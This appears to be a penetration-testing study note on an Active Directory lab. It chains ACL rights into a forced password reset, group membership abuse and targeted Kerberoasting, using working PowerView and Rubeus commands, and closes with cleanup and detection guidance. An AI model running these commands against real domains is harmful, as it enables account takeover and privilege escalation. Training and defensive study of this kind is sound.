# 🧨 ACL Abuse Tactics

> [!info] Objective  
> This section moves from **ACL enumeration** into actually abusing the permissions discovered in the previous section.
> 
> The core idea is:
> 
> **A low-privileged account does not need to be privileged itself if its ACL rights can be chained into control of more privileged objects.**
> 
> In this lab, the chain is:
> 
> ```text
> wley
>   │
>   │ ForceChangePassword
>   ▼
> damundsen
>   │
>   │ GenericWrite
>   ▼
> Help Desk Level 1
>   │
>   │ nested membership
>   ▼
> Information Technology
>   │
>   │ GenericAll
>   ▼
> adunn
>   │
>   │ replication rights
>   ▼
> DCSync
> ```
> 
> The important CPTS skill is not memorizing one attack. It is learning to **follow ACL relationships from one controlled identity to the next until the attack path reaches a high-impact object**.

---

# 💻 1. Command Cheat Sheet

|Command|What it does|
|---|---|
|`powershell`|Opens a PowerShell session.|
|`$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force`|Converts a plaintext password into a PowerShell `SecureString`.|
|`$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)`|Creates a `PSCredential` object for authenticating as `wley`.|
|`$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`|Creates a `SecureString` containing the replacement password for `damundsen`.|
|`Import-Module .\PowerView.ps1`|Loads PowerView into the current PowerShell session.|
|`Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose`|Uses the ACL permission of `wley` to reset `damundsen`'s password.|
|`$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`|Creates a `SecureString` for the newly assigned `damundsen` password.|
|`$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)`|Creates credentials for authenticating as `damundsen`.|
|`Get-ADGroup -Identity "Help Desk Level 1" -Properties * \| Select -ExpandProperty Members`|Displays the current members of the target group.|
|`Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose`|Adds `damundsen` to the target group using his `GenericWrite`-derived group control.|
|`Get-DomainGroupMember -Identity "Help Desk Level 1" \| Select MemberName`|Lists members of the target group.|
|`Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`|Adds a temporary/fake SPN to `adunn` for targeted Kerberoasting.|
|`.\Rubeus.exe kerberoast /user:adunn /nowrap`|Requests a Kerberos service ticket for `adunn`'s SPN and outputs the Kerberoastable hash.|
|`Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose`|Removes the temporary SPN from `adunn`.|
|`Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose`|Removes `damundsen` from the `Help Desk Level 1` group.|
|`Get-DomainGroupMember -Identity "Help Desk Level 1" \| Select MemberName \| ? {$_.MemberName -eq 'damundsen'} -Verbose`|Verifies whether `damundsen` is still a member of the group.|
|`ConvertFrom-SddlString "<SDDL>"`|Converts an SDDL security descriptor into a more readable PowerShell security descriptor.|
|`ConvertFrom-SddlString "<SDDL>" \| Select -ExpandProperty DiscretionaryAcl`|Displays only the DACL/`DiscretionaryAcl` entries from the converted security descriptor.|
|`pth-net`|Pass-the-Hash toolkit option mentioned as a Linux-side alternative for performing domain operations with alternate credentials.|
|`targetedKerberoast`|Linux tool that can automate targeted Kerberoasting by temporarily creating an SPN, requesting the ticket, and removing the temporary SPN.|

---

# 🧭 2. Tool Roles & Differences

|Tool / Technique|Main role|Where it fits|
|---|---|---|
|[PowerView]|PowerShell-based AD enumeration and manipulation|Enumerating and abusing ACLs directly from Windows|
|[SharpHound]|BloodHound data collector|Collecting AD relationship data|
|[BloodHound]|Graph analysis and attack-path visualization|Understanding direct and transitive ACL relationships|
|`Set-DomainUserPassword`|Password reset through AD permissions|Abusing `ForceChangePassword`|
|`Add-DomainGroupMember`|Group membership modification|Abusing group control such as `GenericWrite`|
|`Set-DomainObject`|Modify AD object attributes|Abusing object control such as `GenericAll`|
|[Rubeus]|Kerberos tooling|Performing Kerberoasting|
|[targetedKerberoast]|Automated targeted Kerberoasting|Temporary-SPN Kerberoasting from Linux|
|`ConvertFrom-SddlString`|SDDL interpretation|Detection / investigation of directory ACL changes|
|`pth-net`|Pass-the-Hash operations|Linux alternative when working with NTLM credentials|

> [!important] Mental Model  
> **PowerView performs the action. BloodHound helps you understand why the action is possible and how the permissions connect.**
> 
> Think of an ACL attack chain as a graph:
> 
> ```text
> Identity → Permission → Object → New Identity/Privilege → Permission → Object
> ```
> 
> Every time you gain control of another identity or group, **enumerate again from that new position**.

---

# 🧠 3. The Complete ACL Attack Path

The lab begins with control of `wley`.

The NTLMv2 hash for `wley` was previously captured with Responder and cracked offline with Hashcat.

The discovered ACL relationships provide the following path:

```text
┌──────────────┐
│     wley     │
└──────┬───────┘
       │
       │ ForceChangePassword
       ▼
┌──────────────┐
│  damundsen   │
└──────┬───────┘
       │
       │ GenericWrite
       ▼
┌──────────────────────┐
│ Help Desk Level 1    │
└──────────┬───────────┘
           │
           │ Nested group membership
           ▼
┌──────────────────────┐
│ Information Technology│
└──────────┬───────────┘
           │
           │ GenericAll
           ▼
┌──────────────┐
│    adunn     │
└──────┬───────┘
       │
       │ Replication rights
       ▼
┌──────────────┐
│   DCSync     │
└──────────────┘
```

The important observation is that **no single permission necessarily gives immediate Domain Admin access**.

Instead:

```text
Weak starting account
        ↓
ACL abuse
        ↓
New account/group control
        ↓
Inherited permissions
        ↓
More powerful object control
        ↓
High-impact account
        ↓
Domain-level attack
```

---

# 🔐 4. Step 1 — Authenticate as `wley`

We first need to execute the ACL abuse using the credentials of `wley`.

If the current PowerShell process is not already running under `wley`, create a `PSCredential` object.

## Creating a `PSCredential` Object

```powershell
$SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

### What is happening?

```text
Plaintext password
       ↓
ConvertTo-SecureString
       ↓
SecureString
       ↓
PSCredential
       ↓
INLANEFREIGHT\wley
```

`$Cred` can then be supplied to PowerView functions that support alternate credentials.

> [!tip] Why use `PSCredential`?  
> It allows PowerView to perform the LDAP/domain operation using the privileges of `wley` instead of relying on the identity running the current PowerShell process.

---

# 🔑 5. Step 2 — Abuse `ForceChangePassword`

From the previous ACL enumeration, we discovered:

```text
wley
  │
  └── ForceChangePassword
          ↓
      damundsen
```

This means `wley` can force a password reset on `damundsen`.

First create the password that will be assigned to `damundsen`:

```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

Load PowerView:

```powershell
cd C:\Tools\
Import-Module .\PowerView.ps1
```

Then reset the password:

```powershell
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

Expected output:

```text
VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```

### 🧠 Why this works

The important part is not the PowerView command itself.

The important relationship is:

```text
wley
 │
 │ ACL: ForceChangePassword
 ▼
damundsen
```

`wley` does **not** need to be an administrator.

The ACL grants `wley` the specific ability required to change `damundsen`'s password.

> [!warning] Operational consideration  
> Changing another user's password is potentially disruptive. During a real assessment, this should be explicitly authorized and documented.

---

# 👤 6. Step 3 — Authenticate as `damundsen`

We now know the password assigned to `damundsen`.

Create credentials for the newly controlled account:

```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

Now the attacker's position has changed:

```text
Before:

wley
 │
 └── Can control damundsen


After:

wley
 │
 └── Password for damundsen known
                    ↓
               damundsen
```

> [!important] CPTS Methodology  
> **Every time you gain a new identity, treat that identity as a new enumeration starting point.**
> 
> Do not stop after gaining credentials.

---

# 👥 7. Step 4 — Abuse `GenericWrite` on the Group

From the ACL enumeration performed previously:

```text
damundsen
     │
     │ GenericWrite
     ▼
Help Desk Level 1
```

The next objective is therefore to place `damundsen` into the `Help Desk Level 1` group.

First, enumerate the existing members:

```powershell
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members
```

Example output:

```text
CN=Stella Blagg,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Marie Wright,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Jerrell Metzler,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Evelyn Mailloux,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Juanita Marrero,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Joseph Miller,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Wilma Funk,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Maxie Brooks,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Scott Pilcher,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Orval Wong,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=David Werner,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Alicia Medlin,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Lynda Bryant,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Tyler Traver,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Maurice Duley,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=William Struck,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Denis Rogers,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Billy Bonds,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Gladys Link,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Gladys Brooks,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Margaret Hanes,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Michael Hick,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Timothy Brown,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Nancy Johansen,OU=Operations,OU=Logistics-HK,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Valerie Mcqueen,OU=Operations,OU=Logistics-LAX,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
```

Now add `damundsen`:

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

Expected output:

```text
VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
```

Confirm:

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

Example:

```text
MemberName
----------
busucher
spergazed

<SNIP>

damundsen
dpayne
```

---

# 🧬 8. Why the Group Membership Matters

This is the critical AD concept:

```text
damundsen
    │
    │ member of
    ▼
Help Desk Level 1
    │
    │ nested in
    ▼
Information Technology
```

Therefore:

```text
damundsen
     ↓
Help Desk Level 1
     ↓
Information Technology
```

`damundsen` inherits the effective permissions associated with the nested group membership.

This is why **group nesting must always be considered when following ACL attack paths**.

> [!important] Mental Model — ACL + Groups  
> An ACL attack path is not always:
> 
> ```text
> User → User
> ```
> 
> It can be:
> 
> ```text
> User
>   ↓
> Group
>   ↓
> Nested Group
>   ↓
> User
> ```
> 
> The group relationships are part of the attack path.

---

# 🎯 9. Step 5 — Abuse `GenericAll` over `adunn`

From the previous enumeration:

```text
Information Technology
          │
          │ GenericAll
          ▼
        adunn
```

Because `damundsen` is now effectively a member of `Information Technology`, the permissions associated with that group can be leveraged against `adunn`.

At this point, there are multiple possible ways to abuse the control.

One option is to reset the account password.

However, the scenario introduces an important alternative.

---

# 🎟️ 10. Targeted Kerberoasting Instead of Changing `adunn`'s Password

Suppose:

- `damundsen` can be modified without concern.
    
- `adunn` is an administrative account.
    
- Changing `adunn`'s password could interrupt the user.
    
- We have `GenericAll` over `adunn`.
    

Instead of changing the password, we can modify the `servicePrincipalName` attribute.

The idea is:

```text
GenericAll over adunn
          ↓
Modify servicePrincipalName
          ↓
Create temporary/fake SPN
          ↓
Request TGS
          ↓
Obtain Kerberoast hash
          ↓
Crack offline
          ↓
Recover adunn password
```

This is known as **targeted Kerberoasting**.

---

# 🧩 11. Creating a Fake SPN

The relevant AD attribute is:

```text
servicePrincipalName
```

Use `Set-DomainObject`:

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

Important part:

```powershell
-Identity adunn
-SET @{serviceprincipalname='notahacker/LEGIT'}
```

The fake SPN is:

```text
notahacker/LEGIT
```

The verbose output confirms that PowerView modified the object:

```text
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
```

> [!important] Why does the fake SPN matter?  
> Kerberos associates a service ticket with an SPN.
> 
> By adding an SPN to a controlled account, we make that account appear to have a Kerberos service identity that can be requested.
> 
> The resulting TGS can then be subjected to offline password cracking.

---

# 🔥 12. Kerberoasting with Rubeus

Use [Rubeus] to request the ticket:

```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

Relevant output:

```text
[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : adunn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : adunn
[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : notahacker/LEGIT
[*] PwdLastSet             : 3/1/2022 11:29:08 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$ <SNIP>
```

The important result is the Kerberos TGS hash:

```text
$krb5tgs$23$*adunn$...
```

This can be passed to Hashcat for **offline cracking**.

The source then continues toward using the recovered `adunn` password to authenticate as `adunn` and perform DCSync in the next section.

> [!info] Attack transition
> 
> ```text
> GenericAll
>     ↓
> Modify SPN
>     ↓
> Kerberos TGS
>     ↓
> $krb5tgs$23$...
>     ↓
> Offline cracking
>     ↓
> adunn credentials
>     ↓
> DCSync
> ```
> 
> DCSync is the next section; the important concept here is understanding **why GenericAll made targeted Kerberoasting possible**.

---

# 🐧 13. Linux Alternative — `targetedKerberoast`

The same technique can be performed from a Linux attack host using [targetedKerberoast].

The tool can automate the temporary-SPN workflow:

```text
Create temporary SPN
        ↓
Request TGS
        ↓
Retrieve Kerberoast hash
        ↓
Delete temporary SPN
```

This is useful when the attack host is Linux rather than Windows/PowerShell.

> [!tip] Tool-selection mental model
> 
> ```text
> Windows attack host
>       ↓
> PowerView + Rubeus
> 
> Linux attack host
>       ↓
> targetedKerberoast
> ```
> 
> The underlying technique is the same; the tooling and execution environment differ.

---

# 🧹 14. Cleanup

ACL attacks can modify the environment in several ways.

In this attack we changed:

1. `adunn`'s `servicePrincipalName`
    
2. `Help Desk Level 1` group membership
    
3. `damundsen`'s password
    

These modifications should be reversed where authorized and possible.

> [!important] Cleanup order matters  
> The source specifically emphasizes this order:
> 
> ```text
> 1. Remove fake SPN
>        ↓
> 2. Remove damundsen from group
>        ↓
> 3. Restore damundsen password
> ```
> 
> If `damundsen` is removed from the group first, we may lose the rights required to remove the fake SPN.

---

# 🧹 15. Remove the Fake SPN

Use:

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
```

Expected output:

```text
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Clearing 'serviceprincipalname' for object 'adunn'
```

---

# 👥 16. Remove `damundsen` from the Group

```powershell
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
```

Expected output:

```text
VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Remove-DomainGroupMember] Removing member 'damundsen' from group 'Help Desk Level 1'
True
```

Confirm:

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

No `damundsen` result indicates that the membership was removed.

---

# 🔑 17. Restore the Password

The final modification is the password of `damundsen`.

If the original password is known and the engagement permits restoration, restore it.

If the original password is unknown, the client should reset the account appropriately.

> [!warning] Reporting requirement  
> Even if cleanup is performed successfully, **every modification made during the assessment should be documented in the final report**.
> 
> Record:
> 
> - Account whose password was changed
>     
> - Original/new password handling
>     
> - Group membership modifications
>     
> - SPN modifications
>     
> - Objects affected
>     
> - Time of modification
>     
> - Cleanup performed
>     
> - Any changes that could not be reverted
>     

---

# 🔎 18. Why ACL Attack Chains Can Be More Valuable Than Individual ACLs

A single ACL entry may look harmless in isolation.

For example:

```text
User A
  │
  └── GenericWrite → Group B
```

But if:

```text
Group B
   ↓
Nested in Group C
   ↓
Group C
   ↓
GenericAll → Admin User
```

the complete relationship becomes:

```text
User A
  ↓
GenericWrite
  ↓
Group B
  ↓
Nested membership
  ↓
Group C
  ↓
GenericAll
  ↓
Admin User
```

This is why ACL enumeration should not stop after finding the first interesting ACE.

> [!important] CPTS Mental Model  
> **An ACL is an edge in an attack graph.**
> 
> Your job is to determine:
> 
> ```text
> Who controls what?
>        ↓
> What can that control do?
>        ↓
> What new identity/object does it expose?
>        ↓
> What does that new identity control?
>        ↓
> Can the chain reach a high-impact object?
> ```

---

# 🧭 19. When to Exploit vs. When to Only Enumerate

Not every ACL path should necessarily be exploited.

A path may be:

- Long
    
- Time-consuming
    
- Destructive
    
- Operationally disruptive
    
- Dependent on changing a user's password
    
- Dependent on modifying privileged accounts
    
- Difficult to clean up safely
    

For example:

```text
ACL path discovered
        │
        ├── Safe / authorized
        │       ↓
        │    Validate
        │
        └── Potentially disruptive
                ↓
          Enumerate + document
                ↓
          Present evidence
                ↓
            Recommend remediation
```

> [!warning] Client authorization  
> Password changes, group membership changes, SPN modifications, and other directory modifications should be performed only when authorized by the engagement rules.
> 
> If exploitation could disrupt a production account, demonstrating the attack path through enumeration may be preferable to actually executing it.

---

# 🛡️ 20. Detection and Remediation

## 20.1 🔍 Audit Dangerous ACLs

Organizations should regularly audit Active Directory permissions for dangerous ACL relationships.

Useful approaches include:

- Reviewing ACLs on high-impact users/groups
    
- Identifying unexpected `GenericAll`
    
- Identifying unexpected `GenericWrite`
    
- Identifying password-reset rights
    
- Reviewing rights over privileged groups
    
- Using BloodHound to visualize dangerous relationships
    
- Removing unnecessary permissions
    

The goal is to reduce unnecessary control relationships before they can be chained.

---

## 20.2 👥 Monitor High-Impact Group Membership

Important groups should have visibility and monitoring around membership changes.

Examples include:

```text
Domain Admins
Enterprise Admins
Administrators
High-impact custom groups
Groups nested into privileged groups
```

The important detection concept is:

```text
Unexpected group membership change
             ↓
Investigate who performed it
             ↓
Determine whether an ACL relationship enabled it
             ↓
Review surrounding directory modifications
```

---

## 20.3 📝 Audit ACL / Directory Changes

The source recommends enabling **Advanced Security Audit Policy** to help detect unwanted Active Directory modifications.

A particularly relevant event is:

```text
Event ID 5136
Directory Service Object Modified
```

This event can indicate that a directory object was modified.

> [!important] Detection chain
> 
> ```text
> ACL / object modified
>        ↓
> Event ID 5136
>        ↓
> Inspect modified object
>        ↓
> Inspect security descriptor / SDDL
>        ↓
> Determine what permission changed
>        ↓
> Identify account responsible
> ```

---

# 🧾 21. SDDL — Security Descriptor Definition Language

Windows security descriptors can be represented using **SDDL**.

SDDL is compact but difficult to interpret manually.

Example:

```text
O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)...
```

The raw representation contains information about:

- Owner
    
- Group
    
- DACL
    
- ACEs
    
- Access masks
    
- Object GUIDs
    
- Security identifiers
    
- Inheritance
    
- SACL/auditing information
    

The raw format is therefore useful for Windows security processing but difficult for quick human analysis.

---

# 🔄 22. Convert SDDL to a Readable Security Descriptor

Use:

```powershell
ConvertFrom-SddlString "<SDDL>"
```

The resulting object exposes properties such as:

```text
Owner
Group
DiscretionaryAcl
SystemAcl
RawDescriptor
```

Example output from the source:

```text
Owner            : BUILTIN\Administrators
Group            : BUILTIN\Administrators
DiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT
                   AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,
                   Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed
                   (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
                   WriteExtendedAttributes)...}
SystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),
                   BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), INLANEFREIGHT\Domain Users:
                   SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess
                   (Traverse)...}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```

---

# 🔬 23. Inspect Only the `DiscretionaryAcl`

To focus specifically on the DACL:

```powershell
ConvertFrom-SddlString "<SDDL>" | select -ExpandProperty DiscretionaryAcl
```

The resulting output is much easier to inspect:

```text
Everyone: AccessDenied (WriteData)
Everyone: AccessAllowed (WriteExtendedAttributes)
NT AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions, Traverse, WriteExtendedAttributes)
NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions, WriteExtendedAttributes)
NT AUTHORITY\Authenticated Users: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions, WriteExtendedAttributes)
NT AUTHORITY\SYSTEM: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
BUILTIN\Administrators: AccessAllowed (ChangePermissions, CreateDirectories, Delete, ExecuteKey, GenericExecute, GenericRead, GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteAttributes, WriteExtendedAttributes)
BUILTIN\Pre-Windows 2000 Compatible Access: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions, WriteExtendedAttributes)
INLANEFREIGHT\Domain Admins: AccessAllowed (ChangePermissions, CreateDirectories, ExecuteKey, GenericExecute, GenericRead, GenericWrite, ListDirectory, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, WriteAttributes, WriteExtendedAttributes)
INLANEFREIGHT\Enterprise Admins: AccessAllowed (ChangePermissions, CreateDirectories, Delete, DeleteSubdirectoriesAndFiles, ExecuteKey, FullControl, GenericAll, GenericExecute, GenericRead, GenericWrite, ListDirectory, Modify, Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, TakeOwnership, Traverse, Write, WriteAttributes, WriteData, WriteExtendedAttributes, WriteKey)
INLANEFREIGHT\Organization Management: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions, WriteExtendedAttributes)
INLANEFREIGHT\Exchange Trusted Subsystem: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions, WriteExtendedAttributes)
INLANEFREIGHT\mrb3n: AccessAllowed (CreateDirectories, GenericExecute, GenericRead, GenericWrite, ReadExtendedAttributes, ReadPermissions, Traverse, WriteExtendedAttributes)
```

The notable entry in this example is:

```text
INLANEFREIGHT\mrb3n:
    AccessAllowed
    GenericWrite
```

This indicates that `mrb3n` was granted `GenericWrite` privileges over the affected object.

That kind of modification can be significant because `GenericWrite` can enable an attacker to modify attributes or otherwise alter the object depending on the object's type and effective permissions.

---

# 🧠 24. Understanding the Detection Perspective

The offensive and defensive views are essentially the same relationship viewed from opposite directions.

### Offensive perspective

```text
Who can modify this object?
        ↓
What can they modify?
        ↓
Can I turn that permission into control?
```

### Defensive perspective

```text
Who modified this object?
        ↓
What changed?
        ↓
Was the change authorized?
        ↓
Does the new ACL enable dangerous control?
```

This is why Event ID `5136`, security descriptors, SDDL, and DACL analysis are useful when investigating ACL abuse.

---

# 🗺️ 25. ACL Attack Methodology

The complete methodology from this section can be reduced to:

```text
              CONTROLLED USER
                     │
                     ▼
             Enumerate ACLs
                     │
                     ▼
          Identify interesting ACE
                     │
                     ▼
            Determine what it
                enables
                     │
          ┌──────────┴──────────┐
          ▼                     ▼
     Control user          Control group
          │                     │
          └──────────┬──────────┘
                     ▼
             Enumerate again
                     │
                     ▼
            Follow nesting
                     │
                     ▼
          Find next ACL edge
                     │
                     ▼
           Reach higher-value
                 object
                     │
                     ▼
       Choose least disruptive
           authorized abuse
                     │
                     ▼
             Validate access
                     │
                     ▼
              Clean up
                     │
                     ▼
              Report changes
```

---

# 🧩 26. The Important ACL Relationships in This Attack

|ACL / Relationship|Effect in this attack|
|---|---|
|`ForceChangePassword`|`wley` can reset `damundsen`'s password|
|`GenericWrite`|`damundsen` can modify the `Help Desk Level 1` group|
|Nested group membership|`damundsen` inherits the effective privileges of `Information Technology`|
|`GenericAll`|Allows extensive control over `adunn`, including modifying attributes such as `servicePrincipalName`|
|`servicePrincipalName` modification|Enables the targeted Kerberoasting path|
|TGS for fake SPN|Produces a Kerberoastable hash for offline cracking|
|Replication rights|The next stage can lead toward DCSync|

---

# 🧠 27. Why `GenericAll` Is Especially Interesting

`GenericAll` represents broad control over an object.

In this attack, it is particularly useful because the target is a **user account**.

The important idea is not:

```text
GenericAll = one specific action
```

Instead:

```text
GenericAll
    ↓
Broad object control
    ↓
Look at object type
    ↓
Determine useful modifications
    ↓
Choose an attack technique
```

For a user object, possible abuse paths can include modifying attributes or changing credentials, depending on the effective permissions and environment.

Here, the selected technique is:

```text
GenericAll
   ↓
Modify SPN
   ↓
Targeted Kerberoasting
```

---

# 🧠 28. Why the Fake SPN Is Temporary

The fake SPN does not need to remain on the account after obtaining the TGS.

Therefore:

```text
Add fake SPN
     ↓
Request TGS
     ↓
Extract hash
     ↓
Remove fake SPN
```

This minimizes the modification window and restores the object afterward.

The automated `targetedKerberoast` workflow follows the same basic concept by creating a temporary SPN, retrieving the ticket/hash, and removing the temporary SPN.

